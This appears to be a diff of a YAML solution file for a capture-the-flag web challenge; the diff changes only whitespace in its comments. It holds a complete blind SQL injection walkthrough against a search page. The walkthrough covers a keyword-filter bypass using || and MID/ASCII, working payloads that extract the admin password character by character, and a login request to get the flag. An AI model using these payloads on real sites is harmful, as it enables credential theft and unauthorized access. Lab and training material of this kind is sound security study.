@@ -15,7 +15,7 @@ tricks:
     payload: |
       # search.php line 28:
       # $sql = "SELECT * from users where username=\"". filter_chars($_REQUEST["username"])."\"";
-      # 
+      #
       # Vulnerability: username parameter directly concatenated into SQL query
       # filter_chars() filters spaces and some keywords, but allows injection
       # Filter checks (line 19-23):
@@ -31,7 +31,7 @@ tricks:
       # SQL becomes: SELECT * from users where username="admin"||"1"="1"
       # This evaluates to: username="admin" OR "1"="1" (always true)
       # If admin exists, returns "User exists: admin"
-      # 
+      #
       POST /search.php
       username=admin"||"1"="1
       # Response: "User exists: admin" (confirms injection works)
@@ -43,12 +43,12 @@ tricks:
       # Payload: admin"||length(password)>X||"1"="1
       # Uses || (OR) operator, no spaces needed
       # Binary search: test if length > mid value
-      # 
+      #
       # Example:
       admin"||length(password)>10||"1"="1
       # If true: length > 10, search higher
       # If false: length <= 10, search lower
-      # 
+      #
       # Continue until exact length found
 
   - name: "Step 4: Extract password character by character"
@@ -57,14 +57,14 @@ tricks:
     payload: |
       # Bypass filter: use MID() instead of SUBSTRING/SUBSTR
       # Use ASCII() for character comparison
-      # 
+      #
       # Payload: admin"||ASCII(MID(password,POS,1))>VALUE||"1"="1
-      # 
+      #
       # Example for position 1:
       admin"||ASCII(MID(password,1,1))>65||"1"="1
       # If true: ASCII > 65 (character > 'A')
       # If false: ASCII <= 65 (character <= 'A')
-      # 
+      #
       # Binary search on ASCII values (32-126) to find exact character
       # Repeat for each position (1 to password_length)
 
@@ -75,11 +75,11 @@ tricks:
       # login.php uses prepared statements (safe)
       # But checks password with direct comparison (line 38):
       # if ($password === $row["password"])
-      # 
+      #
       # Need exact password match
       POST /login.php
       username=admin&password=<extracted_password>
-      # 
+      #
       # Response: "Congratz, flag is FLAG{...}"
       # Extract flag from response
 
@@ -88,16 +88,15 @@ tricks:
     how: "Use alternative SQL functions and operators"
     payload: |
       # Filtered: spaces, AND, NULL, WHERE, LIMIT, LIKE, SUBSTRING, SUBSTR
-      # 
+      #
       # Bypass techniques:
       # 1. Use || instead of spaces (works in MySQL)
       # 2. Use MID() instead of SUBSTRING/SUBSTR
       # 3. Use ASCII() for character comparison
       # 4. Use length() for length checks
       # 5. Use >, <, = for comparisons (no AND needed)
-      # 
+      #
       # Example payloads:
       admin"||length(password)>10||"1"="1
       admin"||ASCII(MID(password,1,1))>65||"1"="1
       admin"||MID(password,1,1)="T"||"1"="1
-
